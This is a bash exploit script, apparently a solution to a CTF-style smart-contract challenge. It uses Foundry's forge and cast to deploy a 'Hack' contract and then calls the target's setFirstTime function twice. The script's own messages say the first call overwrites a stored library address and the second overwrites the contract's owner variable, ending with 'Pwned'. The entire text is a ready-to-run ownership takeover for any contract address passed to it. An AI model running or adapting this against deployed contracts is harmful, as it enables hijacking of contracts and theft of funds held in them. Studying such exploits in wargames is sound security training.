#!/bin/bash

set -o pipefail
set -o nounset

TARGET="$1"
RPC="$2"
PK="$3"


HACK="$(forge create --broadcast ./Hack.sol:Hack -r $RPC --private-key $PK | tail -n 2 | head -n 1 | cut -d ':' -f2 | sed 's/ //g')"
echo "Deployed to $HACK"

TIMESTAMP="$(cast to-uint256 $HACK)"

echo "Hack address in uint256 is : $TIMESTAMP"
echo "Sending first tx to the target to write first library address with our own contract..."
cast send $TARGET "setFirstTime(uint256)" "$TIMESTAMP" -r $RPC --private-key $PK

echo "Sending last tx to the target to write owner variable with our own contract..."
cast send $TARGET "setFirstTime(uint256)" "0x0" -r $RPC --private-key $PK

echo "Pwned"